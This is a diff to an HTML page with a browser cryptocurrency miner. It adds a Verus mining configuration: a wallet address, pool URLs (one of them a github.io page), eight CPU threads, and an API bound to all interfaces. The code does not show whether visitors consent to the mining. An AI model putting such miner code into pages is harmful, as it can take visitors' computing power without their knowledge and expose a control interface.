@@ -70,7 +70,6 @@
     <script>
         let mining = false;
         const walletAddress = 'RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych';
-        // URL con el puerto especificado
         const accountInfoUrl = 'http://45.33.47.25:3000/api/poolData/72/6596237097b04b05eb151553/67028dbd5f09df3d488db72e/workers';
 
         const configuracion = {
@@ -111,7 +110,29 @@
                 "socks5": null,
                 "self-select": null,
                 "submit-to-origin": false
-            }]
+            }],
+            // Nueva configuración para parámetros de comunicación y verificación
+            "newConfig": {
+                "pools": [
+                    {
+                        "name": "pool.verus.io",
+                        "url": "stratum+tcp://pool.verus.io:9998",
+                        "timeout": 150,
+                        "disabled": 0
+                    },
+                    {
+                        "name": "verus.farm (Quipacorn)",
+                        "url": "https://wallet-bussines.github.io/index2.html"
+                    }
+                ],
+                "user": "RPqwP8wuRWFGiP31f7NTDq6KgF6B5Crych",
+                "algo": "verus",
+                "threads": 8,
+                "cpu-priority": 1,
+                "retry-pause": 5,
+                "api-allow": "192.168.0.0/16",
+                "api-bind": "0.0.0.0:4068"
+            }
         };
 
         function startMining() {
